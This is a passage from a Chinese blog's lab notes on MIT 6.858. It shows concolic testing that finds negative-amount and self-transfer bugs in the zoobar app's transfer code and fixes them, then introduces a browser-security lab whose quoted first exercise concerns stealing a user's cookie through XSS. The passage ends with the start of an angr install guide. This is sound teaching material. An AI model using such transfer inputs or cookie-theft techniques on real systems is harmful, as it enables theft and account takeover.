zoobar.zoodb.transfer_setup()<br>  tdb.query(zoobar.zoodb.Transfer).delete()<br>  tdb.commit()<br>  <span class="hljs-comment">##...</span><br></code></pre></td></tr></table></figure><p>在 <code>zoobar/zoodb.py</code> 中定义了 Person 数据库，其中 balance（也就是 zoobars 字段）的初始值为 10，同时主键为 <code>username</code> ：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span>(<span class="hljs-title class_ inherited__">PersonBase</span>):<br>    __tablename__ = <span class="hljs-string">&quot;person&quot;</span><br>    username = Column(String(<span class="hljs-number">128</span>), primary_key=<span class="hljs-literal">True</span>)<br>    password = Column(String(<span class="hljs-number">128</span>))<br>    token = Column(String(<span class="hljs-number">128</span>))<br>    zoobars = Column(Integer, nullable=<span class="hljs-literal">False</span>, default=<span class="hljs-number">10</span>)<br>    profile = Column(String(<span class="hljs-number">5000</span>), nullable=<span class="hljs-literal">False</span>, default=<span class="hljs-string">&quot;&quot;</span>)<br></code></pre></td></tr></table></figure><p>在该文件中还定义了 Transfer 数据库，应当用以表示单次交易的双方及数值：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Transfer</span>(<span class="hljs-title class_ inherited__">TransferBase</span>):<br>    __tablename__ = <span class="hljs-string">&quot;transfer&quot;</span><br>    <span class="hljs-built_in">id</span> = Column(Integer, primary_key=<span class="hljs-literal">True</span>)<br>    sender = Column(String(<span class="hljs-number">128</span>))<br>    recipient = Column(String(<span class="hljs-number">128</span>))<br>    amount = Column(Integer)<br>    time = Column(String)<br></code></pre></td></tr></table></figure><p>那么我们不难想到的是，我们可以遍历 Person 数据库以获得所有用户的用户名集合，接下来遍历 Transfer 数据库来将用户名集合中的非 sender 给剔除（因为我们主要关注 recipient 发生了 balance 缩小的情况），最后检查剩余用户是否存在 balance 小于初始值的情况，若是则说明存在漏洞：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">## Detect zoobar theft.</span><br><span class="hljs-comment">## When detected, call report_zoobar_theft()</span><br>udict = &#123;&#125;<br><span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> pdb.query(zoobar.zoodb.Person).<span class="hljs-built_in">all</span>():<br>  udict[p.username] = p<br><span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> tdb.query(zoobar.zoodb.Transfer).<span class="hljs-built_in">all</span>():<br>  udict.pop(t.sender)<br><span class="hljs-keyword">for</span> username <span class="hljs-keyword">in</span> udict.keys():<br>  <span class="hljs-keyword">if</span> udict[username].zoobars &lt; <span class="hljs-number">10</span>:<br>    report_zoobar_theft()<br></code></pre></td></tr></table></figure><p>成功通过 Exercise 9：</p><p><img src="https://s2.loli.net/2022/12/24/FnSvPHRsQbc6LZT.png" alt="image.png"></p><p>最后是 Exercise 10，修复 balance mismatch 和 zoobar theft 这两个漏洞（Lab 已经替我们修好了 eval injection 的漏洞），需要注意的是这里评测系统要求将存在问题的源码文件拷贝到 <code>zoobar-fixed</code> 下再进行修复，：</p><blockquote><p><strong>Exercise 10.</strong> Fix the two bugs you found in Exercise 9, by copying whatever <code>.py</code> files you need to modify from the <code>zoobar</code> directory to <code>zoobar-fixed</code> and changing them there.</p><p>Recall that our check for exercises 3-6, where you implemented the core of the concolic execution system, was not complete. If you are having trouble with this exercise, it may be that you did not implement exercises 3-6 correctly, so you may need to go back and fix it.</p><p>To check whether your solution works correctly, you need to run <strong>.&#x2F;check-symex-zoobar-fixed.sh</strong> and see whether the output still contains the messages <code>Exception: eval injection</code>, <code>WARNING: Balance mismatch detected</code> and <code>WARNING: Zoobar theft detected</code>. Alternatively, you can run <strong>make check</strong>, which will do this for you.</p></blockquote><p>那么我们首先要找到漏洞出现的位置，笔者最初的思路是在两个找到漏洞的 report 函数进行约束求解就可以获得造成问题的输入，但是<strong>这个做法并不可行，因为本 Lab 提供的混合执行框架是高度封装好的</strong>，在 <code>concolic_execs()</code> 的执行过程中我们是没办法中途停下来进行约束求解的</p><blockquote><p>笔者思考了半天怎么改才能在 <code>test_stuff()</code> 的两个 report() 函数进行约束求解来得到触发漏洞的输入，后面发现基本没啥可行性，实在要弄的话需要对整个框架进行大改，故就此作罢改换思路…</p></blockquote><p>我们重新思考一个问题：  <em>Lab 3 为什么提供的是混合执行框架而非纯符号执行或是纯具体执行呢？</em>  </p><p>正如前文所言，concolic execution 的诞生便是为了解决 symbolic execution 与 concrete execution 所分别存在的问题，融合两者的特性来达到一个更好的效果</p><p>现在让我们重新审视 <code>concolic_execs()</code> 的执行流程：</p><ul><li>由一个外层大循环不断迭代<ul><li>从输入队列中取出具体值字典</li><li>调用 <code>concolic_exec_input()</code> 执行目标函数，获取到返回值、分支条件列表、分支调用方列表</li><li>将得到的新的返回值添加至 <code>outs</code> 集合</li><li>内层小循环遍历分支条件列表<ul><li>调用 <code>concolic_force_branch()</code> 获取将当前分支条件逆转后的约束条件</li><li>若该约束不在 <code>checked</code> （已验证约束集合）中，添加，并调用 <code>concolic_find_input()</code> 进行约束求解</li><li>约束可解，将结果添加到下一次作为输入的具体值字典中</li></ul></li></ul></li></ul><p>我们不难得知的是，当 <code>test_stuff()</code> 报告漏洞时，<strong>说明我们的 concolic execution system 给出了一个能够触发漏洞的 concrete input</strong></p><p>我们可以使用如下语句来将输出重定向至当前目录下的 <code>typescript</code> 文件：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">script -c ./check-symex-zoobar.py</span><br></code></pre></td></tr></table></figure><p>前面我们用到的两个 report() 函数实际上就只是 <code>print()</code> 而已，我们只需要在输出结果中搜索对应的字符串即可：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">report_balance_mismatch</span>():<br>  <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;WARNING: Balance mismatch detected&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">report_zoobar_theft</span>():<br>  <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;WARNING: Zoobar theft detected&quot;</span>)<br></code></pre></td></tr></table></figure><p>以下是两个例子：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python">Trying concrete value: &#123;<span class="hljs-string">&#x27;form_recipient_present&#x27;</span>: <span class="hljs-number">1</span>, <span class="hljs-string">&#x27;form_zoobars_present&#x27;</span>: <span class="hljs-number">1</span>, <span class="hljs-string">&#x27;form_zoobars_val&#x27;</span>: <span class="hljs-string">&#x27;-10&#x27;</span>, <span class="hljs-string">&#x27;rsplit_split_cookie_=_r_#_r&#x27;</span>: <span class="hljs-string">&#x27;atok&#x27;</span>, <span class="hljs-string">&#x27;rsplit_split_cookie_=_r_#_l&#x27;</span>: <span class="hljs-string">&#x27;alice&#x27;</span>, <span class="hljs-string">&#x27;split_cookie_=_r&#x27;</span>: <span class="hljs-string">&#x27;alice#atok&#x27;</span>, <span class="hljs-string">&#x27;split_cookie_=_l&#x27;</span>: <span class="hljs-string">&#x27;PyZoobarLogin&#x27;</span>, <span class="hljs-string">&#x27;cookie&#x27;</span>: <span class="hljs-string">&#x27;PyZoobarLogin=alice#atok&#x27;</span>, <span class="hljs-string">&#x27;path&#x27;</span>: <span class="hljs-string">&#x27;fer&#x27;</span>, <span class="hljs-string">&#x27;form_recipient_val&#x27;</span>: <span class="hljs-string">&#x27;alice&#x27;</span>, <span class="hljs-string">&#x27;referrer&#x27;</span>: <span class="hljs-string">&#x27;&#x27;</span>&#125;<br>Response: <span class="hljs-number">200</span> OK<br>  Content-<span class="hljs-type">Type</span>: text/html; charset=utf-<span class="hljs-number">8</span><br>  Content-Length: <span class="hljs-number">1689</span><br>  X-XSS-Protection: <span class="hljs-number">0</span><br><span class="hljs-string">b&#x27;&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n    &lt;head&gt;\n        &lt;meta charset=&quot;utf-8&quot;&gt;\n        &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css...</span><br><span class="hljs-string"># response，比较长且无意义，这里暂且省略</span><br><span class="hljs-string">WARNING: Balance mismatch detected</span><br><span class="hljs-string">Trying concrete value: &#123;&#x27;</span>form_recipient_present<span class="hljs-string">&#x27;: 1, &#x27;</span>form_zoobars_present<span class="hljs-string">&#x27;: 1, &#x27;</span>form_zoobars_val<span class="hljs-string">&#x27;: &#x27;</span>-<span class="hljs-number">10</span><span class="hljs-string">&#x27;, &#x27;</span>rsplit_split_cookie_=_r_<span class="hljs-comment">#_r&#x27;: &#x27;atok&#x27;, &#x27;rsplit_split_cookie_=_r_#_l&#x27;: &#x27;alice&#x27;, &#x27;split_cookie_=_r&#x27;: &#x27;alice#atok&#x27;, &#x27;split_cookie_=_l&#x27;: &#x27;PyZoobarLogin&#x27;, &#x27;cookie&#x27;: &#x27;PyZoobarLogin=alice#atok&#x27;, &#x27;path&#x27;: &#x27;fer&#x27;, &#x27;form_recipient_val&#x27;: &#x27;bob&#x27;, &#x27;referrer&#x27;: &#x27;&#x27;&#125;</span><br>Response: <span class="hljs-number">200</span> OK<br>  Content-<span class="hljs-type">Type</span>: text/html; charset=utf-<span class="hljs-number">8</span><br>  Content-Length: <span class="hljs-number">1686</span><br>  X-XSS-Protection: <span class="hljs-number">0</span><br><span class="hljs-string">b&#x27;&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n    &lt;head&gt;\n        &lt;meta charset=&quot;utf-8&quot;&gt;\n        &lt;link rel=&quot;stylesheet&quot; type=&quot;tex...</span><br><span class="hljs-string"># response，比较长且无意义，这里暂且省略</span><br><span class="hljs-string">WARNING: Zoobar theft detected</span><br></code></pre></td></tr></table></figure><p>参数的含义不难辨认，<code>form_zoobars_val</code> 为单次 transfer 的数值，<code>cookie</code> 表示发送方用户名及 cookie，<code>form_recipient_val</code> 表示接收方用户名，那么这里我们可以推断出至少可能存在两个漏洞：</p><ul><li>未对负数的 transfer 进行过滤，导致一个用户可以盗取另一用户的 balance</li><li>未对 self-transfer 的情况做合适处理，导致最后总的 balance 不一致</li></ul><p>但这个时候我们只知道  <em>漏洞是存在的</em>  ，而不知道  <em>漏洞在何处</em>  ，那这里我们需要再审一审日志别的地方，我们不难发现会有一些抛异常的日志：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python">Trying concrete value: &#123;<span class="hljs-string">&#x27;form_recipient_present&#x27;</span>: <span class="hljs-number">1</span>, <span class="hljs-string">&#x27;form_zoobars_present&#x27;</span>: <span class="hljs-number">1</span>, <span class="hljs-string">&#x27;rsplit_split_cookie_=_r_#_r&#x27;</span>: <span class="hljs-string">&#x27;atok&#x27;</span>, <span class="hljs-string">&#x27;rsplit_split_cookie_=_r_#_l&#x27;</span>: <span class="hljs-string">&#x27;alice&#x27;</span>, <span class="hljs-string">&#x27;split_cookie_=_r&#x27;</span>: <span class="hljs-string">&#x27;alice#atok&#x27;</span>, <span class="hljs-string">&#x27;split_cookie_=_l&#x27;</span>: <span class="hljs-string">&#x27;PyZoobarLogin&#x27;</span>, <span class="hljs-string">&#x27;cookie&#x27;</span>: <span class="hljs-string">&#x27;PyZoobarLogin=alice#atok&#x27;</span>, <span class="hljs-string">&#x27;path&#x27;</span>: <span class="hljs-string">&#x27;fer&#x27;</span>, <span class="hljs-string">&#x27;form_zoobars_val&#x27;</span>: <span class="hljs-string">&#x27;1&#x27;</span>, <span class="hljs-string">&#x27;referrer&#x27;</span>: <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;form_recipient_val&#x27;</span>: <span class="hljs-string">&#x27;&#x27;</span>&#125;<br>Traceback (most recent call last):<br>  File <span class="hljs-string">&quot;/home/student/lab/zoobar/transfer.py&quot;</span>, line <span class="hljs-number">16</span>, <span class="hljs-keyword">in</span> transfer<br>    bank.transfer(g.user.person.username,<br>  File <span class="hljs-string">&quot;/home/student/lab/zoobar/bank.py&quot;</span>, line <span class="hljs-number">12</span>, <span class="hljs-keyword">in</span> transfer<br>    recipient_balance = recipientp.zoobars + zoobars<br>AttributeError: <span class="hljs-string">&#x27;NoneType&#x27;</span> <span class="hljs-built_in">object</span> has no attribute <span class="hljs-string">&#x27;zoobars&#x27;</span><br>Response: <span class="hljs-number">200</span> OK<br>  Content-<span class="hljs-type">Type</span>: text/html; charset=utf-<span class="hljs-number">8</span><br>  Content-Length: <span class="hljs-number">1683</span><br>  X-XSS-Protection: <span class="hljs-number">0</span><br><span class="hljs-string">b&#x27;&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n    &lt;head&gt;\n        &lt;meta charset=&quot;utf-8&quot;&gt;\n       </span><br><span class="hljs-string"># response，比较长且无意义，这里暂且省略</span><br></code></pre></td></tr></table></figure><p>说明主要的处理逻辑应当是在 <code>zoobar/bank.py</code> 中的 <code>transfer()</code> 函数，接下来就是代码审计+修复环节了，该函数的核心逻辑主要就是开头这一段：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">transfer</span>(<span class="hljs-params">sender, recipient, zoobars</span>):<br>    persondb = person_setup()<br>    senderp = persondb.query(Person).get(sender)<br>    recipientp = persondb.query(Person).get(recipient)<br><br>    sender_balance = senderp.zoobars - zoobars<br>    recipient_balance = recipientp.zoobars + zoobars<br><br>    <span class="hljs-keyword">if</span> sender_balance &lt; <span class="hljs-number">0</span> <span class="hljs-keyword">or</span> recipient_balance &lt; <span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">raise</span> ValueError()<br><br>    senderp.zoobars = sender_balance<br>    recipientp.zoobars = recipient_balance<br>    persondb.commit()<br><br>    <span class="hljs-comment">##...</span><br></code></pre></td></tr></table></figure><p>可以看出：</p><ul><li>缺失了对 transfer 数量为负的检查</li><li>重复赋值导致对 self-transfer 的情况计算错误</li></ul><p>修改的办法其实比较简单，由于 username 为主键，故若 <code>sender == recipient</code>，直接跳过转账操作即可，同时对 transfer 数量为负数的情况直接转为 0 即可：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">transfer</span>(<span class="hljs-params">sender, recipient, zoobars</span>):<br>    <span class="hljs-comment"># for zoobars &lt; 0, convert it to 0</span><br>    <span class="hljs-keyword">if</span> zoobars &lt; <span class="hljs-number">0</span>:<br>        zoobars = <span class="hljs-number">0</span><br>    <br>    <span class="hljs-comment"># if self-transfer, we don&#x27;t need to do anything</span><br>    <span class="hljs-keyword">if</span> sender != recipient:<br>        persondb = person_setup()<br>        senderp = persondb.query(Person).get(sender)<br>        recipientp = persondb.query(Person).get(recipient)<br><br>        sender_balance = senderp.zoobars - zoobars<br>        recipient_balance = recipientp.zoobars + zoobars<br><br>        <span class="hljs-keyword">if</span> sender_balance &lt; <span class="hljs-number">0</span> <span class="hljs-keyword">or</span> recipient_balance &lt; <span class="hljs-number">0</span>:<br>            <span class="hljs-keyword">raise</span> ValueError()<br><br>        senderp.zoobars = sender_balance<br>        recipientp.zoobars = recipient_balance<br>        persondb.commit()<br>    <br>    <span class="hljs-comment">##...</span><br></code></pre></td></tr></table></figure><p>运行，成功通过所有检查</p><p><img src="https://s2.loli.net/2022/12/25/GYVItmEXyuZCUfo.png" alt="image.png"></p><p>至此，Lab 3 全部完成</p><h1 id="0x04-Lab-4-Browser-security（uncompleted）"><a href="#0x04-Lab-4-Browser-security（uncompleted）" class="headerlink" title="0x04.Lab 4: Browser security（uncompleted）"></a>0x04.Lab 4: Browser security（uncompleted）</h1><h2 id="Introduction-2"><a href="#Introduction-2" class="headerlink" title="Introduction"></a>Introduction</h2><p>本 Lab 主要带大家做基于浏览器的攻击（browser-based attacks，其实就是 web 手玩的那一套），包括：</p><ul><li>Part 1：跨站脚本攻击（cross-site scripting attack，XSS）</li><li>Part 2：侧信道与钓鱼攻击（side channel and phishing attack）</li><li>Part 3：一个简单的蠕虫（a profile worm）</li></ul><h2 id="Network-setup"><a href="#Network-setup" class="headerlink" title="Network setup"></a>Network setup</h2><p>因为我们需要在 web 浏览器构造攻击，为了保证评分系统正常，我们的 zoobar web 服务器必须要在 <code>http://localhost:8080/</code> 上进行访问</p><p><del>如果你是使用 KVM 或 VirtualBox，自己回去翻实验手册</del>；如果你使用 VMWare，我们将通过 ssh 进行端口转发</p><p>首先找到你的虚拟机的 IP：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">ip addr show dev eth0</span><br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/12/25/COioRUJdS81apIG.png" alt="image.png"></p><p>对于 Mac 和 Linux 用户，在宿主机上运行以下命令即可：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">ssh -L localhost:8080:localhost:8080 student@VM-IP-ADDRESS</span><br>student@VM-IP-ADDRESS&#x27;s password: 6858<br></code></pre></td></tr></table></figure><p>对于 Windows 用户，<del>没救了等死吧</del>，如果你用的是 PuTTY，可以根据这些  <a href="https://web.archive.org/web/20140811071925/http://www.cs.uu.nl/technical/services/ssh/putty/puttyfw.html">instructions</a> 完成设置，<del>如果你用的是 OpenSSH 那就等死吧</del></p><h2 id="Web-browser"><a href="#Web-browser" class="headerlink" title="Web browser"></a>Web browser</h2><p>本 Lab 推荐使用  <a href="https://www.mozilla.com/firefox/">Mozilla Firefox</a> ， <del>说是 Firefox 可以在许多种OS 上跑但👴寻思 Chrome 不照样能而且应用范围不知道比 Firefox 多多少了</del> ，若开启了 ad-blocking 等插件则需要将其关闭</p><h2 id="Setting-up-the-web-server"><a href="#Setting-up-the-web-server" class="headerlink" title="Setting up the web server"></a>Setting up the web server</h2><p>首先还是按惯例保存 Lab 3 的答案，切到 Lab 4 分支，make 一下检查有没有问题：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell">student@vm-6858:~$ cd lab<br>student@vm-6858:~/lab$ git commit -am &#x27;my solution to lab3&#x27;<br>[lab3 c54dd4d] my solution to lab3<br> 1 files changed, 1 insertions(+), 0 deletions(-)<br>student@vm-6858:~/lab$ git pull<br>Already up-to-date.<br>student@vm-6858:~/lab$ git checkout -b lab4 origin/lab4<br>Branch lab4 set up to track remote branch lab4 from origin.<br>Switched to a new branch &#x27;lab4&#x27;<br>student@vm-6858:~/lab$ make<br>...<br></code></pre></td></tr></table></figure><p>然后按惯例用下面的语句在 8080 端口跑 zookd：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">student@vm-6858:~/lab$ ./zookd 8080<br></code></pre></td></tr></table></figure><p>然后在  <code>http://localhost:8080/</code> 就可以看到我们的 Zoobar 页面<del>还是一如既往的老样子</del></p><p><img src="https://s2.loli.net/2022/12/25/dU7ZvOKPLX4mzs9.png" alt="image.png"></p><h2 id="Crafting-attacks"><a href="#Crafting-attacks" class="headerlink" title="Crafting attacks"></a>Crafting attacks</h2><p>本 Lab 中我们将用不同的攻击手段来攻击 zoobar，评测系统将在清空注册用户数据库（除了 <code>&quot;attacker&quot;</code> 用户）后运行我们的攻击脚本，与前面的 Lab 类似的是我们同样可以通过 <code>make check</code> 来进行检查，需要注意的是该检查并不够彻底（尤其是对于条件竞争而言），我们可能需要多运行几次来确认攻击成功</p><p>对于 Exercise 5、13、14 与 challenge 而言，<code>make check</code> 脚本不足以看出站点在攻击前后的区别，因此这需要我们自行完成对比（MIT 的老师也会手动完成评测， <del>他真的👴哭死</del> ）；<code>make check</code> 在运行时会在 <code>lab4-tests/</code> 下生成攻击页面应有的外观的图片（<code>answer-XX.ref.png</code>）与我们的攻击页面的实际的样子（<code>answer-XX.png</code>），我们应当要确保两者应当一致</p><h2 id="Part-1-a-cross-site-scripting-XSS-attack"><a href="#Part-1-a-cross-site-scripting-XSS-attack" class="headerlink" title="Part 1: a cross-site scripting (XSS) attack"></a>Part 1: a cross-site scripting (XSS) attack</h2><p>zoobar 的用户界面有一个能从登入用户的浏览器窃取其 cookie 的漏洞（若攻击者能诱导用户点击一个精心构造的连接），我们的工作便是构造这样一个链接</p><p>需求的前置知识：Javascript，DOM 等</p><p>接下来是 Exercise 1，在  <code>answer-1.js</code> 中编写攻击脚本打印出用户的 cookie，本地测试的话就保留一份 <code>zoobar/templates/users.html</code> 的拷贝并添加  <code>&lt;script&gt;</code>  标签来引入攻击脚本：</p><blockquote><p><strong>Exercise 1: Print cookie.</strong></p><p>Cookies are HTTP’s main mechanism for tracking users across requests. If an attacker can get ahold of another user’s cookie, they can completely impersonate that other user. For this exercise, your goal is simply to print the cookie of the currently logged-in user when they access the “Users” page.</p><ol><li><p>Read about how <a href="https://developer.mozilla.org/en-US/docs/Web/API/document.cookie">cookies are accessed from Javascript</a>.</p></li><li><p>Save a copy of <code>zoobar/templates/users.html</code> (you’ll need to restore this original version later). Add a <code>&lt;script&gt;</code> tag to <code>users.html</code> that prints the logged-in user’s cookie using <code>alert()</code></p><p>Your script might not work immediately if you made a Javascript programming error. Fortunately, Chrome has fantastic debugging tools accessible in the Inspector: the JavaScript console, the DOM inspector, and the Network monitor. The JavaScript console lets you see which exceptions are being thrown and why. The DOM Inspector lets you peek at the structure of the page and the properties and methods of each node it contains. The Network monitor allows you to inspect the requests going between your browser and the website. By clicking on one of the requests, you can see what cookie your browser is sending, and compare it to what your script prints.</p></li><li><p>Put the contents of your script in a file named <code>answer-1.js</code>. Your file should only contain javascript (don’t include <code>&lt;script&gt;</code> tags).</p></li></ol></blockquote>]]></content>
    
    
    <summary type="html">&lt;p&gt;不如买个 CTF 课&lt;/p&gt;</summary>
    
    
    
    <category term="EXPERIMENTS" scheme="http://blog.arttnba3.cn/categories/EXPERIMENTS/"/>
    
    
    <category term="信息安全" scheme="http://blog.arttnba3.cn/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
    <category term="符号执行" scheme="http://blog.arttnba3.cn/tags/%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C/"/>
    
    <category term="ret2libc" scheme="http://blog.arttnba3.cn/tags/ret2libc/"/>
    
    <category term="栈溢出" scheme="http://blog.arttnba3.cn/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/"/>
    
    <category term="ret2shellcode" scheme="http://blog.arttnba3.cn/tags/ret2shellcode/"/>
    
    <category term="实验笔记" scheme="http://blog.arttnba3.cn/tags/%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/"/>
    
    <category term="MIT" scheme="http://blog.arttnba3.cn/tags/MIT/"/>
    
    <category term="Concolic Execution" scheme="http://blog.arttnba3.cn/tags/Concolic-Execution/"/>
    
  </entry>
  
  <entry>
    <title>【ANGR.0x00】从 angr-CTF 入门 angr 的基本用法</title>
    <link href="http://blog.arttnba3.cn/2022/11/24/ANGR-0X00-ANGR_CTF/"/>
    <id>http://blog.arttnba3.cn/2022/11/24/ANGR-0X00-ANGR_CTF/</id>
    <published>2022-11-23T18:48:35.000Z</published>
    <updated>2022-12-02T18:23:54.271Z</updated>
    
    <content type="html"><![CDATA[<p>你说的对，但是 <a href="https://github.com/angr/angr">angr</a> 是一个使用 Python 编写的跨平台开源二进制分析框架…</p><span id="more"></span><h1 id="0x00-一切开始之前"><a href="#0x00-一切开始之前" class="headerlink" title="0x00.一切开始之前"></a>0x00.一切开始之前</h1><p><a href="https://github.com/angr/angr">angr</a> 是一个使用 Python 编写的跨平台开源二进制<strong>混合</strong>（Concolic）分析框架，为我们提供了一系列实用的二进制分析工具，更多关于 angr 的介绍信息可以看他们的 <a href="https://angr.io/">官网</a> ，关于 angr 提供的 API 则可以查看<a href="https://api.angr.io/">文档</a></p><p><a href="https://github.com/jakespringer/angr_ctf">angr_ctf</a> 是一个非常好的入门级 angr 练手项目，刚好笔者最近在学 angr 相关的东西，所以决定从这个项目开始入门</p><h2 id="PRE-安装-angr-及相关组件"><a href="#PRE-安装-angr-及相关组件" class="headerlink" title="PRE.安装 angr 及相关组件"></a>PRE.安装 angr 及相关组件</h2><p>首先是一些依赖项：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo apt-get install gcc-multilib</span><br></code></pre></td></tr></table></figure><p>angr 本体安装：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">pip3 install angr</span><br></code></pre></td></tr></table></figure><p>然后是 <a href="https://github.com/angr/angrop">angrop</a>，可以自动收集 ROP gadget 以及构建 ROP chain</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">pip3 install angrop</span><br></code></pre></td></tr></table></figure><p><a href="https://github.com/angr/patcherex">patcherex</a> 也是 angr 团队开发的，用以进行自动化的二进制加固</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">apt-get install nasm clang</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">apt-get install clang-10 gcc-avr binutils-avr avr-libc</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">git <span class="hljs-built_in">clone</span> https://github.com/angr/patcherex.git</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cd</span> patcherex</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">pip3 install -e .</span><br></code></pre></td></tr></table></figure><blockquote><p>阿里云源好像妹有 <code>compilerex</code> 这个依赖项，反正最后👴也妹安装上，难受</p></blockquote><p><a href="https://github.com/angr/rex">rex</a> 则是 angr 团队开发的自动 exp 生成器</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">👴妹安成，看看就好</span><br></code></pre></td></tr></table></figure><p><a href="https://github.com/angr/angr-management">angr-management</a> 则是图形化的 angr 界面，安好之后直接在终端输入 <code>angr-management</code> 即可直接启动</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">pip3 install angr-management</span><br></code></pre></td></tr></table></figure><h2 id="PRE2-angr-ctf-基本食用指北"><a href="#PRE2-angr-ctf-基本食用指北" class="headerlink" title="PRE2. angr-ctf 基本食用指北"></a>PRE2. angr-ctf 